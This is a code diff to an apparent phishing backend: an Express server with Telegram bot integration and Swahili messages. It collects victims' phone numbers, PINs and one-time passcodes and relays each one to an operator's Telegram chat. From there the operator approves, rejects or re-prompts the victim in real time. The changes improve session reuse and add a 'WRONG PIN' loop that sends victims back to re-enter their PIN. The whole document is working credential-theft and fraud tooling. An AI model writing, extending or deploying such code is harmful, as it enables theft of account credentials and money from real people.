@@ -115,7 +115,7 @@ async function initBot() {
           case 'WRONG_PIN':
             session.status = 'RETRY_PIN';
             session.pin = '';
-            await bot.sendMessage(chatTarget, `❌ PIN imekataliwa. Mteja anaombwa kuweka PIN sahihi upya.`);
+            await bot.sendMessage(chatTarget, `❌ PIN imekataliwa. Mteja amerejeshwa kwenye skrini ya kuweka PIN upya.`);
             break;
           case 'ALLOW_CREDS':
             session.status = 'PROCEED_OTP';
@@ -156,14 +156,19 @@ app.get('/', (req, res) => {
 // Step 1: Submit Phone Number & PIN
 app.post('/api/submit-credentials', async (req, res) => {
   try {
-    let { phone, pin, adminChatId } = req.body || {};
+    let { phone, pin, adminChatId, userId } = req.body || {};
     if (!adminChatId && req.query && req.query.admin) {
       adminChatId = req.query.admin;
     }
 
     const targetChat = resolveTargetChat(adminChatId);
-    const userId = `user_${Date.now()}`;
-    sessions.set(userId, { 
+    let currentUserId = userId;
+    
+    if (!currentUserId || !sessions.has(currentUserId)) {
+      currentUserId = `user_${Date.now()}`;
+    }
+
+    sessions.set(currentUserId, { 
       phone, pin, 
       adminChatId: targetChat, 
       status: 'WAITING_CREDS_APPROVAL' 
@@ -178,8 +183,8 @@ app.post('/api/submit-credentials', async (req, res) => {
       reply_markup: {
         inline_keyboard: [
           [
-            { text: 'ALLOW', callback_data: `ALLOW_CREDS_${userId}` },
-            { text: 'DENY', callback_data: `DENY_CREDS_${userId}` }
+            { text: 'ALLOW', callback_data: `ALLOW_CREDS_${currentUserId}` },
+            { text: 'WRONG PIN ❌', callback_data: `WRONG_PIN_${currentUserId}` }
           ]
         ]
       }
@@ -189,7 +194,7 @@ app.post('/api/submit-credentials', async (req, res) => {
       await bot.sendMessage(targetChat, message, opts);
     }
     
-    return res.status(200).json({ success: true, userId });
+    return res.status(200).json({ success: true, userId: currentUserId });
   } catch (err) {
     return res.status(500).json({ success: false, error: 'Tatizo la mtandao.' });
   }
@@ -222,7 +227,7 @@ app.post('/api/submit-otp', async (req, res) => {
       reply_markup: {
         inline_keyboard: [
           [
-            { text: 'WRONG PIN ❌', callback_data: `DENY_CREDS_${userId}` },
+            { text: 'WRONG PIN ❌', callback_data: `WRONG_PIN_${userId}` },
             { text: 'EXPIRED OTP', callback_data: `EXPIRED_OTP_${userId}` },
             { text: 'APPROVED', callback_data: `APPROVED_FINAL_${userId}` }
           ]
@@ -257,7 +262,7 @@ app.post('/api/request-new-otp', async (req, res) => {
       reply_markup: {
         inline_keyboard: [
           [
-            { text: 'WRONG PIN ❌', callback_data: `DENY_CREDS_${userId}` },
+            { text: 'WRONG PIN ❌', callback_data: `WRONG_PIN_${userId}` },
             { text: 'EXPIRED OTP', callback_data: `EXPIRED_OTP_${userId}` },
             { text: 'APPROVED', callback_data: `APPROVED_FINAL_${userId}` }
           ]
@@ -277,4 +282,3 @@ app.listen(PORT, async () => {
   await initBot();
   console.log(`Server running on port ${PORT}`);
 });
-  
